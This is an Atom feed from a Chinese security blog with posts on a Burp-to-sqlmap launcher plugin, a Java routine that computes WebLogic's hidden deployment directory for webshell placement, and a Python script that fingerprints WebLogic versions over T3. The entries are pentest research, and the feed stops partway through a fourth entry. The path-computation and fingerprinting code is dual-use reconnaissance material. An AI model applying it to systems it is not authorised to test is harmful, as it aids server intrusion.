<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>回忆飘如雪</title>
  
  <subtitle>c0ny1&#39;s Blog-专注漏洞艺术</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://gv7.me/"/>
  <updated>2019-09-02T14:50:02.574Z</updated>
  <id>http://gv7.me/</id>
  
  <author>
    <name>c0ny1</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>重构sqlmap4burp插件</title>
    <link href="http://gv7.me/articles/2019/refactoring-sqlmap4burp/"/>
    <id>http://gv7.me/articles/2019/refactoring-sqlmap4burp/</id>
    <published>2019-09-02T12:18:14.000Z</published>
    <updated>2019-09-02T14:50:02.574Z</updated>
    
    <content type="html"><![CDATA[<p>其实联动sqlmap与burp的插件挺多的，有<a href="https://code.google.com/p/gason/" target="_blank" rel="noopener">gson</a>,<a href="https://github.com/portswigger/co2" target="_blank" rel="noopener">CO2</a>,<a href="https://github.com/portswigger/sqli-py" target="_blank" rel="noopener">sqli-py</a>等等。但我独爱<a href="https://github.com/difcareer/sqlmap4burp" target="_blank" rel="noopener">sqlmap4burp</a>,因为它使用超简单。原来在Windows下体验还是很ok的，自从换上mac之后就不好使了。</p><a id="more"></a><p><code>sqlmap4burp</code>项目作者已经很久没有维护了，于是打算对其进行重构。新插件就叫<code>sqlmap4burp++</code>，表示感谢原作者的思路。<code>sqlmap4burp++</code>将<code>兼容更多操作系统</code>，<code>操作更加简单</code>，<code>界面更加简洁</code>！</p><h2 id="0x01-重构之路"><a href="#0x01-重构之路" class="headerlink" title="0x01 重构之路"></a>0x01 重构之路</h2><p>下面简单记录下重构做的一些小工作。</p><h3 id="1-1-去除多余依赖"><a href="#1-1-去除多余依赖" class="headerlink" title="1.1 去除多余依赖"></a>1.1 去除多余依赖</h3><p>原插件依赖<code>commons-io-&lt;version&gt;.jar</code>,<code>commons-langs-&lt;version&gt;.jar</code>这两个jar。但查看代码只是为了可以使用<code>FileUtils.writeByteArrayToFile()</code>和<code>StringUtils.isNoneBlank()</code>两个方法。<code>sqlmap4burp++</code>使用原生Java代码实现，让插件更轻量易编译。</p><h3 id="1-2-去除JTab控件"><a href="#1-2-去除JTab控件" class="headerlink" title="1.2 去除JTab控件"></a>1.2 去除JTab控件</h3><p>现在的Burp插件很丰富，Burp suite JTab控件太多界面会显得特别臃肿。</p><p><img src="/articles/2019/refactoring-sqlmap4burp/sqlmap4burp-tab.png" alt="sqlmap4burp的JTab控件"></p><p>考虑了下该插件并非特别需要JTab面板来添加sqlmap的配置命令，于是去除JTab控件该换成如下的弹窗。</p><p><img src="/articles/2019/refactoring-sqlmap4burp/sqlmap4burp-plus-plus-dlg.png" alt="sqlmap4burp++的弹框控件"></p><h3 id="1-3-多系统支持"><a href="#1-3-多系统支持" class="headerlink" title="1.3 多系统支持"></a>1.3 多系统支持</h3><p>插件会自动将Burp的request数据包保存为<code>xxx.req</code>到java临时目录，而多系统支持无非就是<strong>在目标系统下，能弹出命令行窗口并执行我们的<code>sqlmap -r xxx.req</code>命令</strong>,但各个系统实现的方式都有所不同!</p><h4 id="1-3-1-Windows"><a href="#1-3-1-Windows" class="headerlink" title="1.3.1 Windows"></a>1.3.1 Windows</h4><p>Windows实现比较简单，只需要将sqlmap命令保存为bat脚本（sqlmap4burp.bat），然后执行以下命令：</p><figure class="highlight bat"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cmd</span>.exe /c <span class="built_in">start</span> sqlmap4burp.bat</span><br></pre></td></tr></table></figure><p>实现代码如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">String command = <span class="string">"sqlmap.py -r xxxxx.req"</span>;</span><br><span class="line">List&lt;String&gt; cmds = <span class="keyword">new</span> ArrayList();</span><br><span class="line">cmds.add(<span class="string">"cmd.exe"</span>);</span><br><span class="line">cmds.add(<span class="string">"/c"</span>);</span><br><span class="line">cmds.add(<span class="string">"start"</span>);</span><br><span class="line">String batFilePath = Util.makeBatFile(<span class="string">"sqlmap4burp.bat"</span>,command); <span class="comment">//生成bat文件</span></span><br><span class="line">cmds.add(batFilePath);</span><br><span class="line"><span class="keyword">new</span> ProcessBuilder(cmds).start();</span><br></pre></td></tr></table></figure><h4 id="1-3-2-Mac-OS-X"><a href="#1-3-2-Mac-OS-X" class="headerlink" title="1.3.2 Mac OS X"></a>1.3.2 Mac OS X</h4><p>Mac下我们可以编写如下<code>osascript</code>脚本来调用Terminal并让它执行sqlmap命令。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">tell application &quot;Terminal&quot;</span><br><span class="line">activate</span><br><span class="line">do script &quot;sqlmpa.py -r xxx.req&quot;</span><br><span class="line">end tell</span><br></pre></td></tr></table></figure><p>实现代码如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">String command = <span class="string">"sqlmap.py -r xxxxx.req"</span>;</span><br><span class="line">List&lt;String&gt; cmds = <span class="keyword">new</span> ArrayList();</span><br><span class="line">cmds.add(<span class="string">"osascript"</span>);</span><br><span class="line">cmds.add(<span class="string">"-e"</span>);</span><br><span class="line">String cmd = <span class="string">"tell application \"Terminal\" \n"</span> +</span><br><span class="line">        <span class="string">"        activate\n"</span> +</span><br><span class="line">        <span class="string">"        do script \"%s\"\n"</span> +</span><br><span class="line">        <span class="string">"end tell"</span>;</span><br><span class="line">cmds.add(String.format(cmd,command));</span><br><span class="line"><span class="keyword">new</span> ProcessBuilder(cmds).start();</span><br></pre></td></tr></table></figure><p>这里需要注意两点：</p><ul><li>第一次运行，mac会提示是否允许外部程序执行osscript，记得允许！</li><li>有时莫名其妙调用osascript不成功，我们需要确保Terminal是运行状态，如果已经是运行状态，可以重启下。</li></ul><h4 id="1-3-3-Linux"><a href="#1-3-3-Linux" class="headerlink" title="1.3.3 Linux"></a>1.3.3 Linux</h4><p>Linux下想实现弹出命令行窗口同时执行命令，我尝试了很多方法，但是都没有成功的。比较接近想要效果的方法是先将sqlmap命令写到shell脚本中（<code>sqlmap4burp.sh</code>）。然后执行如下命令来运行<code>sqlmap4burp.sh</code>：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gnome-terminal -t <span class="string">"sqlmap4burp"</span> -x bash -c <span class="string">"sh ./tmp/sqlmap4burp.sh;exec bash;"</span></span><br></pre></td></tr></table></figure><p>但使用代码去执行的时候并没有弹出<code>Terminal</code>。大家如果有解决方法，可以Fork <a href="https://github.com/c0ny1/sqlmap4burp-plus-plus" target="_blank" rel="noopener">sqlmap4burp++</a>项目贡献代码，或者发送想法到我的邮箱root#gv7.me。</p><p>目前采用临时的方法：先弹出<code>Terminal</code>窗口，然后将生成好的sqlmap命令复制剪贴板，最后手工在弹出的窗口中粘贴并执行。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">String command = <span class="string">"sqlmap.py -r xxxxx.req"</span>;</span><br><span class="line">List&lt;String&gt; cmds = <span class="keyword">new</span> ArrayList();</span><br><span class="line">cmds.add(<span class="string">"/bin/sh"</span>);</span><br><span class="line">cmds.add(<span class="string">"-c"</span>);</span><br><span class="line">cmds.add(<span class="string">"gnome-terminal"</span>);</span><br><span class="line">Util.setSysClipboardText(command); <span class="comment">//sqlmap命令到剪贴板</span></span><br><span class="line"><span class="keyword">new</span> ProcessBuilder(cmds).start();</span><br></pre></td></tr></table></figure><p>完整代码请移步项目地址：<a href="https://github.com/c0ny1/sqlmap4burp-plus-plus" target="_blank" rel="noopener">https://github.com/c0ny1/sqlmap4burp-plus-plus</a></p><h2 id="0x02-插件演示"><a href="#0x02-插件演示" class="headerlink" title="0x02 插件演示"></a>0x02 插件演示</h2><p>插件已经在如下系统测试成功：</p><ul><li>Windows：7,10</li><li>Mac OSX：Mojave 10.14.5</li><li>Linux：Kali2019.2</li></ul><p>请FQ观看演示，或者直接访问：<a href="https://www.youtube.com/watch?v=Rcyfm8bd63o" target="_blank" rel="noopener">https://www.youtube.com/watch?v=Rcyfm8bd63o</a></p><iframe width="560" height="315" src="https://www.youtube.com/embed/Rcyfm8bd63o" frameborder="0" allow="accelerometer; autoplay; encrypted-media; gyroscope; picture-in-picture" allowfullscreen></iframe><h2 id="0x03-参考项目"><a href="#0x03-参考项目" class="headerlink" title="0x03 参考项目"></a>0x03 参考项目</h2><ul><li><a href="https://github.com/blueroutecn/Burpsuite4Extender" target="_blank" rel="noopener">https://github.com/blueroutecn/Burpsuite4Extender</a></li><li><a href="https://github.com/difcareer/sqlmap4burp" target="_blank" rel="noopener">https://github.com/difcareer/sqlmap4burp</a></li></ul>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;其实联动sqlmap与burp的插件挺多的，有&lt;a href=&quot;https://code.google.com/p/gason/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;gson&lt;/a&gt;,&lt;a href=&quot;https://github.com/portswigger/co2&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;CO2&lt;/a&gt;,&lt;a href=&quot;https://github.com/portswigger/sqli-py&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;sqli-py&lt;/a&gt;等等。但我独爱&lt;a href=&quot;https://github.com/difcareer/sqlmap4burp&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;sqlmap4burp&lt;/a&gt;,因为它使用超简单。原来在Windows下体验还是很ok的，自从换上mac之后就不好使了。&lt;/p&gt;
    
    </summary>
    
      <category term="安全开发" scheme="http://gv7.me/categories/%E5%AE%89%E5%85%A8%E5%BC%80%E5%8F%91/"/>
    
    
  </entry>
  
  <entry>
    <title>weblogic“伪随机”目录生成算法探究</title>
    <link href="http://gv7.me/articles/2019/weblogic-pseudo-random-dir-generation-algorithm-exploration/"/>
    <id>http://gv7.me/articles/2019/weblogic-pseudo-random-dir-generation-algorithm-exploration/</id>
    <published>2019-08-20T03:33:21.000Z</published>
    <updated>2019-08-27T16:34:00.387Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x01-背景说明"><a href="#0x01-背景说明" class="headerlink" title="0x01 背景说明"></a>0x01 背景说明</h2><p>我们在渗透测试过程中，可以很容易发现weblogic的    <code>server name</code>一旦被修改，其web应用有一个目录就会发生改变，导致我们在部署war拿shell时受阻。</p><p>比如bea_wls_internal这个weblogic自带web应用的web目录物理路径为：</p><p><strong>weblogic10.3.6.0\user_projects\domains\base_domain\servers\AdminServer\tmp_WL_internal\bea_wls_internal\9j4dqk\war</strong></p><p>PS：为了后面的讨论，这里统一下概念，域名为<code>base_domain</code>,<code>server name</code>为<code>AdminServer</code>,web应用名为<code>bea_wls_internal</code>,伪随机目录为<code>9j4dqk</code>。</p><p>这时如果<code>server name</code>修改为<code>c0ny1</code>的话，经过测试其伪随机目录会变成<code>qn64ct</code>，即该web应用物理路径变为：</p><p><strong>weblogic10.3.6.0\user_projects\domains\base_domain\servers\c0ny1\tmp_WL_internal\bea_wls_internal\qn64ct\war</strong></p><h2 id="0x02-真随机-or-伪随机？"><a href="#0x02-真随机-or-伪随机？" class="headerlink" title="0x02 真随机 or 伪随机？"></a>0x02 真随机 or 伪随机？</h2><p>在此前我一直以为改目录是随机的无法。直到我做了下面的测试，将两个域的<code>server name</code>都改为<code>c0ny1</code>。</p><p><img src="/articles/2019/weblogic-pseudo-random-dir-generation-algorithm-exploration/test1.png" alt="bea_wls_internal随机目录变化"></p><p><img src="/articles/2019/weblogic-pseudo-random-dir-generation-algorithm-exploration/test2.png" alt="bea_wls9_async_reponses随机目录变化"></p><p>发现两个域下相同web应用的随机目录名相同，这说明随机数目录其实是伪随机，它是有算法来生成的。<strong>而通过结果我们很容易就判断出该随机数和域名无关，和<code>server name</code>与<code>application name</code>有关！</strong></p><h2 id="0x03-探究生成算法"><a href="#0x03-探究生成算法" class="headerlink" title="0x03 探究生成算法"></a>0x03 探究生成算法</h2><p>于是我打算跟踪下weblogic源码，扒出负责生产伪随机数的算法函数。由于其生成伪随机目录在weblogic未启动完全情况下，故通过weblogic配置的调试比较难。这种情况下更好的思路是插桩，但要插哪个函数的桩呢？</p><p>我在翻阅weblogic的源码（weblogic.jar）时，着重关注文件操作和部署接口的代码，发现了一个相关性很大的方法。该函数就在weblogic的路径工具类（weblogic.application.utils.PathUtils）中。</p><p><img src="/articles/2019/weblogic-pseudo-random-dir-generation-algorithm-exploration/weblogic-code.png" alt="相关方法"></p><p>在判断不失误的情况下，我们只要知道其传入的参数值就知道改函数如何使用了。为此我编写了如下代码，使用javassist将打印函数参数值的代码注入到该函数中。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> javassist.ClassPool;</span><br><span class="line"><span class="keyword">import</span> javassist.CtClass;</span><br><span class="line"><span class="keyword">import</span> javassist.CtMethod;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Test</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">changeMethode</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            ClassPool.getDefault().insertClassPath(<span class="string">"/Users/c0ny1/IdeaProjects/weblogic-path-test/lib/weblogic.jar"</span>);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 获取需要修改的类</span></span><br><span class="line">            CtClass cls = ClassPool.getDefault().getCtClass(<span class="string">"weblogic.application.utils.PathUtils"</span>);</span><br><span class="line">            <span class="comment">// 获取类中的printTest方法</span></span><br><span class="line">            CtMethod m = cls.getDeclaredMethod(<span class="string">"generateTempPath"</span>);</span><br><span class="line">            <span class="comment">// 在方法中插入新的代码</span></span><br><span class="line">            <span class="comment">//m.insertBefore("System.out.println($1 + File.separator + Long.toString((long)Math.abs(var3.toString().hashCode()), 36));") ;</span></span><br><span class="line">            <span class="comment">// 修改该方法的内容</span></span><br><span class="line">            m.setBody(<span class="string">"&#123;StringBuffer var3 = new StringBuffer();\n"</span> +</span><br><span class="line">                    <span class="string">"        if ($1 != null) &#123;\n"</span> +</span><br><span class="line">                    <span class="string">"            var3.append($1);\n"</span> +</span><br><span class="line">                    <span class="string">"        &#125;\n"</span> +</span><br><span class="line">                    <span class="string">"\n"</span> +</span><br><span class="line">                    <span class="string">"        if ($2 != null) &#123;\n"</span> +</span><br><span class="line">                    <span class="string">"            var3.append(\"_\").append($2);\n"</span> +</span><br><span class="line">                    <span class="string">"        &#125;\n"</span> +</span><br><span class="line">                    <span class="string">"\n"</span> +</span><br><span class="line">                    <span class="string">"        if ($3 != null) &#123;\n"</span> +</span><br><span class="line">                    <span class="string">"            var3.append(\"_\").append($3);\n"</span> +</span><br><span class="line">                    <span class="string">"        &#125;\n"</span> +</span><br><span class="line">                    <span class="string">"\n"</span> +</span><br><span class="line">                    <span class="string">"        String str = $2 + java.io.File.separator + Long.toString((long)Math.abs(var3.toString().hashCode()), 36);\n"</span> +</span><br><span class="line">                    <span class="string">"        System.out.println(\"[+] p1:\" + $1);\n"</span> +</span><br><span class="line">                    <span class="string">"        System.out.println(\"[+] p2:\" + $2);\n"</span> +</span><br><span class="line">                    <span class="string">"        System.out.println(\"[+] p3:\" + $3);\n"</span> +</span><br><span class="line">                    <span class="string">"        System.out.println(\"[+] \" + str);\n"</span> +</span><br><span class="line">                    <span class="string">"        return str;&#125;"</span>);</span><br><span class="line">                    </span><br><span class="line">            <span class="comment">// 解除代码锁定,恢复可编辑状态</span></span><br><span class="line">            cls.defrost();</span><br><span class="line">            <span class="comment">// 写出到外存中</span></span><br><span class="line">            cls.writeFile(<span class="string">"./PathUtils.class"</span>);</span><br><span class="line">            <span class="comment">// testJarClass.writeFile(other path);</span></span><br><span class="line"></span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        changeMethode();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/articles/2019/weblogic-pseudo-random-dir-generation-algorithm-exploration/inject-code.png" alt="被注入代码后的PathUtils类"></p><p>将插桩后的PathUtils类通过Winrar软件覆盖weblogic.jar原来的类，然后重新启动weblogic，即可从控制台查看到如下：</p><p><img src="/articles/2019/weblogic-pseudo-random-dir-generation-algorithm-exploration/weblogic-run-result.png" alt="weblogic重启运行结果"></p><p>由此我们知道web应用bea_wls9_async_response的随机目录被生成时，该函数被调用并传入<code>server name</code>和<code>application name</code>，这也验证我们之前的猜想。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">generateTempPath(<span class="string">"c0ny1"</span>,<span class="string">"bea_wls9_async_response"</span>,<span class="string">"bea_wls9_async_response.war"</span>)</span><br></pre></td></tr></table></figure><h2 id="0x04-伪随机目录生成代码编写"><a href="#0x04-伪随机目录生成代码编写" class="headerlink" title="0x04 伪随机目录生成代码编写"></a>0x04 伪随机目录生成代码编写</h2><p>到这里写计算伪随机目录生成程序就是很简单的事了。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">WeblogicPathBuilder</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title">generateTempPath</span><span class="params">(String paramString1, String paramString2, String paramString3)</span> </span>&#123;</span><br><span class="line">        StringBuffer stringBuffer = <span class="keyword">new</span> StringBuffer();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (paramString1 != <span class="keyword">null</span>) stringBuffer.append(paramString1);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (paramString2 != <span class="keyword">null</span>) &#123;</span><br><span class="line">            stringBuffer.append(<span class="string">"_"</span>).append(paramString2);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (paramString3 != <span class="keyword">null</span>) &#123;</span><br><span class="line">            stringBuffer.append(<span class="string">"_"</span>).append(paramString3);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> Long.toString(Math.abs(stringBuffer.toString().hashCode()), <span class="number">36</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        String ServerName = args[<span class="number">0</span>];</span><br><span class="line">        String AppName = args[<span class="number">1</span>];</span><br><span class="line">        String AppWarName = AppName + <span class="string">".war"</span>;</span><br><span class="line">        System.out.println(generateTempPath(ServerName,AppName,AppWarName));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>计算结果和weblogic实际生成完全吻合！！！</p><p><img src="/articles/2019/weblogic-pseudo-random-dir-generation-algorithm-exploration/calc.png" alt="计算结果"></p><p>之后的几天逛Github时，发现早就有人发现其规律。</p><p><a href="https://github.com/dr0op/WeblogicScan/blob/master/app/plugins/CVE-2019-2618.py" target="_blank" rel="noopener">https://github.com/dr0op/WeblogicScan/blob/master/app/plugins/CVE-2019-2618.py</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;0x01-背景说明&quot;&gt;&lt;a href=&quot;#0x01-背景说明&quot; class=&quot;headerlink&quot; title=&quot;0x01 背景说明&quot;&gt;&lt;/a&gt;0x01 背景说明&lt;/h2&gt;&lt;p&gt;我们在渗透测试过程中，可以很容易发现weblogic的    &lt;code&gt;serve
      
    
    </summary>
    
      <category term="安全研究" scheme="http://gv7.me/categories/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/"/>
    
    
  </entry>
  
  <entry>
    <title>通过t3协议识别weblogic版本</title>
    <link href="http://gv7.me/articles/2019/detection-weblogic-version-by-t3/"/>
    <id>http://gv7.me/articles/2019/detection-weblogic-version-by-t3/</id>
    <published>2019-06-10T01:49:51.000Z</published>
    <updated>2019-08-27T01:52:50.892Z</updated>
    
    <content type="html"><![CDATA[<p><strong>识别weblogic版本有什么用呢？</strong></p><p>在检测weblogic漏洞之前，我们往往需要探测下weblogic版本。好判断是否在漏洞版本范围，同时也为我们构造EXP做准备（相同漏洞，可能因为weblogic版本不同需要的对应的EXP，比如CVE-2019-2725）</p><a id="more"></a><h2 id="0x01-以前的方法"><a href="#0x01-以前的方法" class="headerlink" title="0x01 以前的方法"></a>0x01 以前的方法</h2><p>以前的方法是访问控制台登录页面，页面底部便有版本号！这里注意404页面的<code>10.4.5</code>并不是版本号。</p><p>http://<em>.</em>.<em>.</em>:7001/console/login/LoginForm.jsp</p><p><img src="/articles/2019/detection-weblogic-version-by-t3/login.png" alt="控制台登录页面"></p><p>然而这个页面可能会被删除或禁止访问，那有没有其他方法呢？</p><h2 id="0x02-通过t3协议识别"><a href="#0x02-通过t3协议识别" class="headerlink" title="0x02 通过t3协议识别"></a>0x02 通过t3协议识别</h2><p>最近在学习t3协议时，使用wireshark抓包时发现，协议报文中带有weblogic的版本</p><p><img src="/articles/2019/detection-weblogic-version-by-t3/10.3.6.0.png" alt="使用t3协议10.3.6.0版本通信"></p><p><img src="/articles/2019/detection-weblogic-version-by-t3/12.1.3.0.png" alt="使用t3协议12.1.3.0版本通信"></p><p>所以只需要通过t3协议发送以下数据包，即可从返回包中获取Weblogic版本。</p><pre><code>t3 10.3.6AS: 255HL: 19</code></pre><p>这里需要注意，有时候发送数据包时，可能只会返回一个<code>HELLO</code>。这时候说明t3协议应该是开启的，需要多次提交探测包，才可能在某次中成功获取到。</p><p>下面使用脚本来完成我们的上面的想法。</p><pre><code class="python"><span class="comment">#coding=utf-8</span><span class="keyword">import</span> sys<span class="keyword">import</span> socket<span class="keyword">from</span> socket <span class="keyword">import</span> error <span class="keyword">as</span> socket_error<span class="keyword">import</span> urllib<span class="string">'''</span><span class="string">'''</span><span class="function"><span class="keyword">def</span> <span class="title">t3conn</span><span class="params">(host, port)</span>:</span>        <span class="keyword">try</span>:            server_address = (host, port)            <span class="comment">#print 'INFO: Attempting Connection: ' + str(server_address)</span>            sock = socket.create_connection(server_address, <span class="number">4</span>)            sock.settimeout(<span class="number">5</span>)            headers = <span class="string">'t3 10.3.6\nAS:255\nHL:19\n\n'</span>            sock.sendall(headers)            data = <span class="string">""</span>            <span class="keyword">try</span>:                data = sock.recv(<span class="number">1024</span>)            <span class="keyword">except</span> socket.timeout:                <span class="keyword">print</span> <span class="string">'ERROR: Socket Timeout Occurred: '</span> + str(host) + <span class="string">':'</span> + str(port) + <span class="string">'\n'</span>            sock.close()            <span class="keyword">return</span> data        <span class="keyword">except</span> socket_error:            <span class="keyword">print</span> <span class="string">'ERROR: Connection Failed: '</span> + str(host) + <span class="string">':'</span> + str(port) + <span class="string">'\n'</span>            <span class="keyword">return</span> <span class="string">""</span><span class="function"><span class="keyword">def</span> <span class="title">parseURL</span><span class="params">(url)</span>:</span>    protocol, s1 = urllib.splittype(url)    host, s2=  urllib.splithost(s1)    host, port = urllib.splitport(host)    <span class="keyword">if</span> port == <span class="literal">None</span> <span class="keyword">and</span> protocol == <span class="string">'https'</span>:        port = <span class="number">443</span>    <span class="keyword">elif</span> port == <span class="literal">None</span> <span class="keyword">and</span> protocol == <span class="string">'http'</span>:        port = <span class="number">80</span>    <span class="keyword">return</span> protocol,host,port<span class="function"><span class="keyword">def</span> <span class="title">weblogic</span><span class="params">(url)</span>:</span>    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>, <span class="number">10</span>):        protocol,host,port = parseURL(url)        data = t3conn(host, port)        <span class="keyword">if</span> data.strip() == <span class="string">'HELO'</span>:            <span class="keyword">print</span> <span class="string">'INFO: Sever only returned HELO, retrying to get server version.'</span>            <span class="keyword">continue</span>        <span class="keyword">if</span> data == <span class="string">""</span>:            <span class="keyword">break</span>        <span class="keyword">print</span> data        <span class="keyword">if</span> <span class="string">'HELO'</span> <span class="keyword">in</span> data:            found_weblogic_version = data[<span class="number">5</span>:<span class="number">13</span>]            <span class="keyword">print</span> <span class="string">'[+] version: %s'</span> % found_weblogic_version             <span class="comment">#print '[+] result: %s' % data</span>            <span class="keyword">break</span><span class="function"><span class="keyword">def</span> <span class="title">poc</span><span class="params">(url)</span>:</span>    <span class="keyword">pass</span><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:    weblogic(sys.argv[<span class="number">1</span>])</code></pre><p><img src="/articles/2019/detection-weblogic-version-by-t3/result.png" alt="脚本探测结果"></p><p>如果未探测到，以下几种可能情况：</p><ol><li>t3协议未启用</li><li>服务器做了负载均衡</li></ol><h2 id="0x03-遗留问题"><a href="#0x03-遗留问题" class="headerlink" title="0x03 遗留问题"></a>0x03 遗留问题</h2><p>有些weblogic站点用的https协议，得有t3s协议去探测，我虽然在代码中考虑到了。但是没未成功，一是没有现成的环境，二是没有实实在在使用过t3s协议。等等weblogic经验更丰富时，在解决！</p><h2 id="0x04-后续"><a href="#0x04-后续" class="headerlink" title="0x04 后续"></a>0x04 后续</h2><p>本来想学n1nty师傅对struts2框架的识别的思路，研究目标应用的底层代码，再构造特定的数据包来识别。无奈目前的知识和经验储备还无法支撑这个思路，等后面深入weblogic底层代码时，有发现再做尝试。</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;strong&gt;识别weblogic版本有什么用呢？&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;在检测weblogic漏洞之前，我们往往需要探测下weblogic版本。好判断是否在漏洞版本范围，同时也为我们构造EXP做准备（相同漏洞，可能因为weblogic版本不同需要的对应的EXP，比如CVE-2019-2725）&lt;/p&gt;
    
    </summary>
    
      <category term="安全开发" scheme="http://gv7.me/categories/%E5%AE%89%E5%85%A8%E5%BC%80%E5%8F%91/"/>
    
    
  </entry>
  
  <entry>
    <title>如何快速找到POC/EXP依赖的jar？</title>
    <link href="http://gv7.me/articles/2019/quickly-find-jars-that-depend-on-poc-exp/"/>
    <id>http://gv7.me/articles/2019/quickly-find-jars-that-depend-on-poc-exp/</id>
    <published>2019-05-21T18:43:48.000Z</published>
    <updated>2019-05-21T18:49:22.000Z</updated>
    
